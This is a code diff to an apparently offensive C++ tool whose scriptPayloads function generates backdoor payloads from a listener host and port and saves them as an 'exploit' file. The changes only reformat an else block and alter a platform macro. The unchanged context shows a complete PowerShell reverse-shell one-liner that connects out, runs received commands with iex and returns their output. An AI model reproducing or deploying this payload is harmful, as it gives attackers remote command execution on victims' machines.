@@ -152,7 +152,10 @@ void scriptPayloads (char *backdoor, string lhost, string lport) {
         output+=");$stream = $client.GetStream();[byte[]]$bytes = 0..255|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + \"PS \" + (pwd).Path + \"> \";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()";
     }
 
-    else { printf("Error!\n"); return; }
+    else { 
+        printf("Error!\n"); 
+        return; 
+    }
 
     char rn[30];
     srand (time(NULL));
@@ -168,7 +171,7 @@ void scriptPayloads (char *backdoor, string lhost, string lport) {
     char *path = NULL; path = getcwd(NULL, 0);
     if ( path != NULL )
         rlutil::setColor(2); // Green Color
-        #ifdef OS_Windows
+        #ifdef nt
             cout << "\n\tExploit Location : " << path << "\\" << filename << "\n\n";
         #else
             cout << "\n\tExploit Location : " << path << "/" << filename << "\n\n";
